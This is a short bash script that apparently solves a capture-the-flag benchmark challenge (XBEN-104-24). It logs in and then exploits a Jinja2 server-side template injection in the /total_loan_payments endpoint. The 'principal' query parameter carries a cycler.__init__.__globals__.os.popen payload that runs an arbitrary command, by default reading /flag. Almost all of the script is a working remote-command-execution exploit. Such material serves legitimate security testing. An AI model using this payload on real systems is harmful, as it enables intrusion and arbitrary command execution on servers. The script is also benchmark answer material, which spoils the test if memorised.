#!/usr/bin/env bash
# XBEN-104-24 — Jinja2 SSTI in a JSON-building endpoint. Proxy-mode twin. Log in,
# then /total_loan_payments renders `principal` as a template; the cycler gadget
# runs the command (default: cat /flag).
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
COMMAND="${2:-cat /flag}"
SESSION="xben104p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/login"; BASE="$(req_of GET /)"; [ -n "$BASE" ] || BASE="$(req_of GET login)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/login' --set 'form.username=test' --set 'form.password=test' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=GET' --set 'path=/total_loan_payments' \
  --set "query.principal={{ cycler.__init__.__globals__.os.popen(\"$COMMAND\").read() }}" \
  --set 'query.payment=1' --set 'query.term=1' >/dev/null
print_flag
